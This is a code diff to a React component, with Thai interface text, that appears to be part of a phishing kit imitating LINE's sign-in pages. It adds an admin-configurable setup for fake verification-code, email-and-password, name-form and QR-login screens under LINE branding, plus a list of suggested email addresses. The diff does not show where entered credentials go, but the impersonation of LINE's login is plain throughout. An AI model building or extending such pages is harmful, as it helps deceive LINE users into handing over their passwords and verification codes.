@@ -15,61 +15,109 @@ function App() {
   const [timeLeft, setTimeLeft] = useState(180) // 3 minutes
   const [showEmailSuggestions, setShowEmailSuggestions] = useState(false)
   
-  // ตั้งค่าหน้าที่จะแสดง (จาก Admin Panel)
-  const [pageSettings, setPageSettings] = useState(() => {
+  // โหลดการตั้งค่าจาก Admin Panel
+  const [config, setConfig] = useState(() => {
     try {
-      const saved = localStorage.getItem('pageSettings')
+      const saved = localStorage.getItem('lineFormConfig')
       return saved ? JSON.parse(saved) : {
-        showVerificationPage: true,
-        showEmailLoginPage: true,
-        showFormPage: true,
-        showQRPage: true,
-        pageOrder: ['verification', 'emailLogin', 'form', 'qr']
+        texts: {
+          verificationTitle: 'รหัสยืนยันตัวตน',
+          verificationSubtitle: 'กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย',
+          formTitle: 'ชื่อ',
+          formSubtitle: 'นามสกุล',
+          submitButton: 'ยืนยัน',
+          qrTitle: 'เข้าสู่ระบบด้วยคิวอาร์โค้ด',
+          qrSubtitle: 'โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้นกดสแกนคิวอาร์โค้ด',
+          backToForm: 'เข้าสู่ระบบด้วยอีเมล',
+          howToScan: 'วิธีสแกนคิวอาร์โค้ด',
+          emailTitle: 'LINE',
+          emailLabel: 'อีเมล',
+          passwordLabel: 'รหัสผ่าน',
+          loginButton: 'เข้าสู่ระบบ',
+          mainPageButton: 'เข้าสู่ระบบด้วยรหัสยืนยัน',
+          nextButton: 'เข้าสู่ระบบด้วยอีเมลแทน'
+        },
+        colors: {
+          primary: '#22c55e',
+          secondary: '#3b82f6',
+          background: '#f8fafc'
+        },
+        pages: {
+          verification: true,
+          email: true,
+          form: true,
+          qr: true
+        }
       }
     } catch (error) {
+      console.error('Error loading config:', error)
       return {
-        showVerificationPage: true,
-        showEmailLoginPage: true,
-        showFormPage: true,
-        showQRPage: true,
-        pageOrder: ['verification', 'emailLogin', 'form', 'qr']
+        texts: {
+          verificationTitle: 'รหัสยืนยันตัวตน',
+          verificationSubtitle: 'กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย',
+          formTitle: 'ชื่อ',
+          formSubtitle: 'นามสกุล',
+          submitButton: 'ยืนยัน',
+          qrTitle: 'เข้าสู่ระบบด้วยคิวอาร์โค้ด',
+          qrSubtitle: 'โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้นกดสแกนคิวอาร์โค้ด',
+          backToForm: 'เข้าสู่ระบบด้วยอีเมล',
+          howToScan: 'วิธีสแกนคิวอาร์โค้ด',
+          emailTitle: 'LINE',
+          emailLabel: 'อีเมล',
+          passwordLabel: 'รหัสผ่าน',
+          loginButton: 'เข้าสู่ระบบ',
+          mainPageButton: 'เข้าสู่ระบบด้วยรหัสยืนยัน',
+          nextButton: 'เข้าสู่ระบบด้วยอีเมลแทน'
+        },
+        colors: {
+          primary: '#22c55e',
+          secondary: '#3b82f6',
+          background: '#f8fafc'
+        },
+        pages: {
+          verification: true,
+          email: true,
+          form: true,
+          qr: true
+        }
       }
     }
   })
 
-  // ฟังก์ชันอัปเดตการตั้งค่าเมื่อมีการเปลี่ยนแปลงใน localStorage
+  // ฟังการเปลี่ยนแปลงจาก Admin Panel
   useEffect(() => {
+    const handleConfigUpdate = (event) => {
+      setConfig(event.detail)
+    }
+
     const handleStorageChange = () => {
       try {
-        const saved = localStorage.getItem('pageSettings')
+        const saved = localStorage.getItem('lineFormConfig')
         if (saved) {
-          setPageSettings(JSON.parse(saved))
+          setConfig(JSON.parse(saved))
         }
       } catch (error) {
-        console.error('Error reading page settings:', error)
+        console.error('Error reading config:', error)
       }
     }
 
-    // ฟังการเปลี่ยนแปลงใน localStorage
+    // ฟัง custom event จาก Admin Panel
+    window.addEventListener('configUpdated', handleConfigUpdate)
+    
+    // ฟัง storage change event
     window.addEventListener('storage', handleStorageChange)
     
-    // ตรวจสอบการเปลี่ยนแปลงทุก 1 วินาที (สำหรับการเปลี่ยนแปลงในแท็บเดียวกัน)
+    // ตรวจสอบการเปลี่ยนแปลงทุก 1 วินาที
     const interval = setInterval(handleStorageChange, 1000)
 
     return () => {
+      window.removeEventListener('configUpdated', handleConfigUpdate)
       window.removeEventListener('storage', handleStorageChange)
       clearInterval(interval)
     }
   }, [])
 
-  // Email suggestions
-  const emailSuggestions = [
-    'sareingsaehx@gmail.com',
-    'user@gmail.com',
-    'admin@line.com'
-  ]
-
-  // Generate random verification code
+  // สร้างรหัสยืนยัน 4 หลัก
   useEffect(() => {
     setVerificationCode(Math.floor(1000 + Math.random() * 9000).toString())
   }, [])
@@ -81,6 +129,13 @@ function App() {
       return () => clearTimeout(timer)
     }
   }, [currentStep, timeLeft])
+
+  // Email suggestions
+  const emailSuggestions = [
+    'sareingsaehx@gmail.com',
+    'user@gmail.com',
+    'admin@line.com'
+  ]
 
   const formatTime = (seconds) => {
     const mins = Math.floor(seconds / 60)
